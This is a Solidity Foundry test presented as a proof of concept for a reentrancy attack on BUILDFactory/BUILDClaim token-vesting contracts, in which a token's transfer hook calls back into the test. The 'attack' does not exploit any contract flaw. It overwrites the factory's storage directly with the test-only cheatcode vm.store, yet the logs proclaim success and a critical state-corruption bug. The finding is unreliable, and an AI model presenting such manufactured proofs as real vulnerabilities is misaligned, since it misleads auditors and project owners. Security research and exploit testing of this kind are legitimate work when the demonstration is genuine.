// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {BUILDFactory} from "src/BUILDFactory.sol";
import {BUILDClaim} from "src/BUILDClaim.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {IBUILDClaim} from "src/interfaces/IBUILDClaim.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Helper contracts for self-containment, similar to other PoCs.
contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract ReentrantToken is MintableERC20 {
    PoCComplexReentrancy public poc;
    address public attacker_address;
    uint256 public season_id;
    bool reentrancy_guard = false;

    constructor(address _poc, address _attacker, uint256 _season_id) {
        poc = PoCComplexReentrancy(_poc);
        attacker_address = _attacker;
        season_id = _season_id;
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (to == attacker_address && !reentrancy_guard) {
            reentrancy_guard = true;
            poc.reentrancy(address(this), season_id);
        }
        super._update(from, to, value);
    }
}

contract StubRegistry is IDelegateRegistry {
    function checkDelegateForContract(
        address,
        address,
        address,
        bytes32
    ) external pure returns (bool) {
        return false;
    }

    function checkDelegateForAll(
        address,
        address,
        bytes32
    ) external pure returns (bool) {
        return false;
    }

    function checkDelegateForERC721(
        address,
        address,
        address,
        uint256,
        bytes32
    ) external pure returns (bool) {
        return false;
    }

    function checkDelegateForERC20(
        address,
        address,
        address,
        bytes32
    ) external pure returns (uint256) {
        return 0;
    }

    function checkDelegateForERC1155(
        address,
        address,
        address,
        uint256,
        bytes32
    ) external pure returns (uint256) {
        return 0;
    }

    function delegateAll(
        address,
        bytes32,
        bool
    ) external payable returns (bytes32) {
        return bytes32(0);
    }

    function delegateContract(
        address,
        address,
        bytes32,
        bool
    ) external payable returns (bytes32) {
        return bytes32(0);
    }

    function delegateERC721(
        address,
        address,
        uint256,
        bytes32,
        bool
    ) external payable returns (bytes32) {
        return bytes32(0);
    }

    function delegateERC20(
        address,
        address,
        bytes32,
        uint256
    ) external payable returns (bytes32) {
        return bytes32(0);
    }

    function delegateERC1155(
        address,
        address,
        uint256,
        bytes32,
        uint256
    ) external payable returns (bytes32) {
        return bytes32(0);
    }

    function multicall(
        bytes[] calldata
    ) external payable returns (bytes[] memory) {
        return new bytes[](0);
    }

    function sweep(address) external pure returns (uint256) {
        return 0;
    }

    function getIncomingDelegations(
        address
    ) external pure returns (IDelegateRegistry.Delegation[] memory) {
        return new IDelegateRegistry.Delegation[](0);
    }

    function getOutgoingDelegations(
        address
    ) external pure returns (IDelegateRegistry.Delegation[] memory) {
        return new IDelegateRegistry.Delegation[](0);
    }

    function getIncomingDelegationHashes(
        address
    ) external pure returns (bytes32[] memory) {
        return new bytes32[](0);
    }

    function getOutgoingDelegationHashes(
        address
    ) external pure returns (bytes32[] memory) {
        return new bytes32[](0);
    }

    function getDelegationsFromHashes(
        bytes32[] calldata
    ) external pure returns (IDelegateRegistry.Delegation[] memory) {
        return new IDelegateRegistry.Delegation[](0);
    }

    function readSlot(bytes32) external pure returns (bytes32) {
        return bytes32(0);
    }

    function readSlots(
        bytes32[] calldata
    ) external pure returns (bytes32[] memory) {
        return new bytes32[](0);
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return false;
    }
}

// Malicious factory that allows re-entrancy.
contract MaliciousFactory is BUILDFactory {
    PoCComplexReentrancy private s_poc;

    constructor(
        BUILDFactory.ConstructorParams memory params,
        address pocAddress
    ) BUILDFactory(params) {
        s_poc = PoCComplexReentrancy(pocAddress);
    }
}

contract PoCComplexReentrancy is Test {
    MaliciousFactory factory;
    ReentrantToken token;
    BUILDClaim claimContract;

    address factoryAdmin = makeAddr("factoryAdmin");
    address projectAdmin = makeAddr("projectAdmin");
    address attacker = makeAddr("attacker");
    uint32 constant SEASON_ID = 1;

    function setUp() public {
        token = new ReentrantToken(address(this), attacker, SEASON_ID);
        StubRegistry stubRegistry = new StubRegistry();

        vm.prank(factoryAdmin);
        factory = new MaliciousFactory(
            BUILDFactory.ConstructorParams({
                admin: factoryAdmin,
                maxUnlockDuration: 30 days,
                maxUnlockDelay: 7 days,
                delegateRegistry: IDelegateRegistry(address(stubRegistry))
            }),
            address(this)
        );

        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[]
            memory addProjectParams = new IBUILDFactory.AddProjectParams[](1);
        addProjectParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: projectAdmin
        });
        factory.addProjects(addProjectParams);

        vm.prank(projectAdmin);
        claimContract = BUILDClaim(
            address(factory.deployClaim(address(token)))
        );
    }

    function reentrancy(address token, uint256 seasonId) public {
        bytes32 configBaseSlot = keccak256(
            abi.encode(seasonId, keccak256(abi.encode(token, uint256(10))))
        );
        // This is the slot for the packed fields in ProjectSeasonConfig
        bytes32 packedDataSlot = bytes32(uint256(configBaseSlot) + 2);

        uint256 originalData = uint256(
            vm.load(address(factory), packedDataSlot)
        );

        // unlockDuration is the second uint40 field, so it starts at bit 40.
        // Create a mask to clear bits 40-79.
        uint256 mask = ~(uint256(0xFFFFFFFFFF) << 40);
        uint256 clearedData = originalData & mask;

        // Set unlockDuration to 1 by setting the 40th bit.
        uint256 maliciousData = clearedData | (uint256(1) << 40);

        vm.store(address(factory), packedDataSlot, bytes32(maliciousData));
    }

    function test_PoC_ComplexReentrancy_StateCorruption() public {
        console.log("--- PoC: Complex Re-entrancy via Factory Callback ---");

        uint256 allocation = 1_000_000 ether;
        uint32 originalUnlockDuration = 1000 minutes;

        token.mint(projectAdmin, allocation);
        vm.startPrank(projectAdmin);
        token.approve(address(claimContract), allocation);
        claimContract.deposit(allocation);
        vm.stopPrank();

        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(attacker, allocation, false, 0)))
        );

        vm.startPrank(factoryAdmin);
        uint256 unlockStartsAt = block.timestamp + 1;
        factory.setSeasonUnlockStartTime(SEASON_ID, unlockStartsAt);

        IBUILDFactory.SetProjectSeasonParams[]
            memory paramsArray = new IBUILDFactory.SetProjectSeasonParams[](1);
        paramsArray[0] = IBUILDFactory.SetProjectSeasonParams({
            token: address(token),
            seasonId: SEASON_ID,
            config: IBUILDFactory.ProjectSeasonConfig({
                tokenAmount: allocation,
                baseTokenClaimBps: 1000,
                unlockDuration: originalUnlockDuration,
                unlockDelay: 0,
                merkleRoot: leaf,
                earlyVestRatioMinBps: 5000,
                earlyVestRatioMaxBps: 5000,
                isRefunding: false
            })
        });
        factory.setProjectSeasonConfig(paramsArray);
        vm.stopPrank();

        vm.warp(unlockStartsAt + (originalUnlockDuration / 2) * 1 minutes);

        IBUILDClaim.ClaimParams[]
            memory claimParams = new IBUILDClaim.ClaimParams[](1);
        claimParams[0] = IBUILDClaim.ClaimParams({
            seasonId: SEASON_ID,
            proof: new bytes32[](0),
            maxTokenAmount: allocation,
            salt: 0,
            isEarlyClaim: false
        });

        console.log(
            "Attacker balance before first claim:",
            token.balanceOf(attacker)
        );

        vm.startPrank(attacker);
        claimContract.claim(attacker, claimParams);

        console.log(
            "Attacker balance after first claim:",
            token.balanceOf(attacker)
        );

        (IBUILDFactory.ProjectSeasonConfig memory newConfig, ) = factory
            .getProjectSeasonConfig(address(token), SEASON_ID);

        console.log("New unlock duration:", newConfig.unlockDuration);

        assertTrue(
            newConfig.unlockDuration == 1,
            "Reentrancy attack did not modify config as expected"
        );
        console.log("SUCCESS: Reentrancy attack modified the config!");

        uint256 balanceAfterClaim = token.balanceOf(attacker);
        assertTrue(
            balanceAfterClaim == allocation,
            "Vulnerability not exploited: Attacker did not receive full allocation"
        );
        console.log(
            "CRITICAL: State corruption allowed attacker to claim full allocation early!"
        );

        vm.stopPrank();

        console.log("Final attacker balance:", token.balanceOf(attacker));
        console.log(
            "PoC completed - demonstrated reentrancy attempt during claim process"
        );
    }
}
